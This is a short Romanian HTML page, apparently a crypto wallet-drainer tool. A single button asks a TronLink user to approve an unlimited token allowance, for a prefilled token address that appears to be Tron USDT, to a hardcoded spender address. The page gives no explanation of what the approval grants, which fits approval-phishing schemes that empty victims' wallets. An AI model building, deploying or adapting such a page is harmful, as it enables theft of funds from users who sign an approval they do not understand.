<!DOCTYPE html>
<html lang="ro">
<head>
  <meta charset="UTF-8">
  <title>Tron Approve - Executare Directă</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px; }
    .container { max-width: 700px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
    input { width: 100%; padding: 12px; margin: 10px 0; font-size: 16px; border: 1px solid #ccc; border-radius: 6px; }
    button { width: 100%; padding: 18px; font-size: 18px; background: #0066ff; color: white; border: none; border-radius: 8px; cursor: pointer; margin: 15px 0; }
    button:hover { background: #0055dd; }
    #status { padding: 15px; margin-top: 15px; border-radius: 8px; font-size: 16px; }
  </style>
</head>
<body>

<div class="container">
  <h2>🚀 Tron Approve Executor</h2>
  
  <label><strong>Token Address:</strong></label>
  <input type="text" id="token" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">

  <label><strong>Spender Address:</strong></label>
  <input type="text" id="spender" value="TWU2qigx3YDhU5bhHp1RTXYpAT3jYETLLG">

  <button onclick="executeApprove()">🚀 EXECUTĂ APPROVE ACUM</button>

  <div id="status">Aștept...</div>
</div>

<script>
async function executeApprove() {
    const status = document.getElementById('status');
    status.style.background = "#fff3cd";
    status.textContent = "Se verifică TronLink...";

    // Verificăm dacă TronLink este instalat
    if (!window.tronWeb) {
        status.style.background = "#f8d7da";
        status.textContent = "❌ TronLink nu este instalat sau nu este activ!";
        return;
    }

    try {
        const tokenAddress = document.getElementById('token').value.trim();
        const spender = document.getElementById('spender').value.trim();

        if (!tokenAddress || !spender) {
            status.textContent = "❌ Completează ambele adrese!";
            return;
        }

        status.textContent = "🔄 Se pregătește tranzacția... Confirmă în TronLink";

        const contract = await window.tronWeb.contract().at(tokenAddress);

        const result = await contract.approve(
            spender,
            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" // infinite
        ).send();

        status.style.background = "#d4edda";
        status.innerHTML = `✅ <strong>Approve reușit!</strong><br><br>Transaction ID:<br><small>${result}</small>`;

        console.log("Tranzacție reușită:", result);

    } catch (error) {
        console.error(error);
        status.style.background = "#f8d7da";
        status.textContent = `❌ Eroare: ${error.message || error}`;
    }
}

// Verificăm automat la încărcare dacă TronLink este disponibil
window.onload = () => {
    if (window.tronWeb) {
        document.getElementById('status').textContent = "✅ TronLink detectat - Poți apăsa butonul";
    }
};
</script>

</body>
</html>
